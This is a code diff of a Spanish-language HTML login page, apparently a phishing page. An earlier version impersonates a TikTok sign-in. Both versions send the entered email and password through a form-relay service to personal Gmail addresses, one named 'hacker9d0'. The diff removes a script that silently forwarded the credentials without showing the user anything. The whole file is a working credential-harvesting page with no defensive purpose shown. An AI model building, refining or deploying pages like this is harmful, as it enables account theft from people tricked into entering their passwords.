@@ -1,19 +1,16 @@
 <!DOCTYPE html>
-
-<html lang=“es”>
+<html lang="es">
 <head>
-<meta charset=“UTF-8” />
-<meta name=“viewport” content=“width=device-width, initial-scale=1.0” />
-<title>Formulario de contacto</title>
-
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Iniciar sesión</title>
 <style>
 * {
   box-sizing: border-box;
 }
-
 body {
   margin: 0;
-  background-image: url(‘IMG_1098.jpeg’);
+  background-image: url('IMG_1098.jpeg');
   background-repeat: no-repeat;
   background-size: cover;
   background-position: center;
@@ -21,13 +18,11 @@ body {
   color: white;
   min-height: 100vh;
   padding: 20px;
-
   display: flex;
   justify-content: center;
   align-items: center;
   font-family: Arial, sans-serif;
 }
-
 .contenedor {
   width: 100%;
   max-width: 420px;
@@ -36,36 +31,25 @@ body {
   background: rgba(0, 0, 0, 0.75);
   backdrop-filter: blur(8px);
 }
-
 h2 {
   text-align: center;
   margin-bottom: 25px;
 }
-
 .field {
   margin-bottom: 18px;
 }
-
 label {
   display: block;
   margin-bottom: 7px;
   font-size: 14px;
 }
-
-input,
-textarea {
+input {
   width: 100%;
   padding: 13px;
   border: none;
   border-radius: 8px;
   font-size: 15px;
 }
-
-textarea {
-  min-height: 120px;
-  resize: vertical;
-}
-
 .submit-btn {
   width: 100%;
   padding: 14px;
@@ -76,24 +60,21 @@ textarea {
   font-weight: bold;
 }
 </style>
-
 </head>
-
 <body>
-
-<div class=“contenedor”>
-
-  <h2>inicia secion con tu cuenta de Tiktok </h2>
-
-  <form     action=”https://formsubmit.co/hacker9d0@gmail.com”     method=“POST”   >
-
+<div class="contenedor">
+  <h2>Iniciar sesión</h2>
+  <form
+    action="https://formsubmit.co/echavarriaadonys@gmail.com"
+    method="POST"
+  >
 <div class="field">
-  <label for="correo">correo electronico</label>
+  <label for="correo">Correo electrónico</label>
   <input
-    type="text"
+    type="email"
     id="correo"
     name="correo"
-    placeholder="correo electrónico"
+    placeholder="tu@correo.com"
     required
   />
 </div>
@@ -103,15 +84,14 @@ textarea {
     type="password"
     id="contraseña"
     name="contraseña"
-    placeholder="contraseña"
+    placeholder="••••••••"
     required
-    
   />
 </div>
 <input
   type="hidden"
   name="_subject"
-  value="Nuevo mensaje recibido"
+  value="Nuevo inicio de sesión"
 />
 <input
   type="hidden"
@@ -119,35 +99,9 @@ textarea {
   value="table"
 />
 <button type="submit" class="submit-btn">
-  Iniciar secion
+  Iniciar sesión
 </button>
-
   </form>
-
 </div>
-<script>
-document.getElementById("formulario").addEventListener("submit", async function(event) {
-  event.preventDefault();
-
-  const formulario = this;
-  const datos = new FormData(formulario);
-
-  try {
-    await fetch("https://formsubmit.co/ajax/echavarriaadonys@gmail.com", {
-      method: "POST",
-      body: datos,
-      headers: {
-        "Accept": "application/json"
-      }
-    });
-
-    // No muestra ningún mensaje ni redirige a otra página.
-    // El formulario permanece en la misma página.
-
-  } catch (error) {
-    console.error("Error al enviar el formulario:", error);
-  }
-});
-</script>
 </body>
 </html>
